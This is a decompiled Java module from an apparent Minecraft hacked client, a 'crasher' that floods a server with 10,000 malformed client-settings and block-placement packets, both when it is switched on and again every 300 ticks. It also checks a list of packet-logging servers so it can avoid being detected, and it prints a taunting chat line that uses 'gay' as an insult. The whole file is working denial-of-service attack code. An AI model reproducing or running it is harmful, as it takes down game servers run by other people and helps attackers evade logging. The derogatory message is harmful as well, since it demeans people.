/*
 * Decompiled with CFR 0_118.
 */
package it.nobusware.client.mods.crashers;

import QuarantineAPI.config.annotation.Handler;
import it.nobusware.client.events.EventUpdate;
import it.nobusware.client.manager.Module;
import it.nobusware.client.mods.FindPacketLog;
import it.nobusware.client.utils.ChatUtils;
import net.minecraft.client.main.Main;
import net.minecraft.entity.player.EntityPlayer;
import net.minecraft.init.Items;
import net.minecraft.item.ItemStack;
import net.minecraft.network.play.client.C08PacketPlayerBlockPlacement;
import net.minecraft.network.play.client.C15PacketClientSettings;

public class CrasherA extends Module {

	public CrasherA(String nome_mod, int tasto, String nome_array_printed, Category categoria) {
		super(nome_mod, tasto, nome_array_printed, categoria);
		setDangerous(true);
	}

	public static boolean active;
	int loop;

	@Handler
	public void onUpdate(EventUpdate event) {
		if (!this.isAbilitato()) {
			return;
		}
		++this.loop;
		if (this.loop > 300) {
			int spam = 0;
			//10000
			int max = 10000;
			while (spam < max) {
				this.mc.thePlayer.sendQueue.addToSendQueue(new C15PacketClientSettings("\ufff8", 7, EntityPlayer.EnumChatVisibility.FULL, true, 127));
				mc.getNetHandler().addToSendQueue(new C08PacketPlayerBlockPlacement(new ItemStack(Items.apple)));
				++spam;
			}
			this.loop = 0;
			ChatUtils.print("Sending packets...");
		}
	}

	@Override
	public void Abilitato() {
		if(FindPacketLog.packetlog.contains(mc.getCurrentServerData().serverIP)) {
			ChatUtils.print("Questo Server Packetlogga!");
			this.toggle();
		}
		active = true;
		int spam = 0;
		int max = 10000;
		while (spam < max) {
			this.mc.thePlayer.sendQueue.addToSendQueue(new C15PacketClientSettings("\ufff8", 7, EntityPlayer.EnumChatVisibility.FULL, true, 127));
			mc.getNetHandler().addToSendQueue(new C08PacketPlayerBlockPlacement(new ItemStack(Items.apple)));
			++spam;
		}
		ChatUtils.print("Gay Server Bye Mom");
		ChatUtils.print("Mommy");
	}

	@Override
	public void Disabilitato() {
		active = false;
	}
}
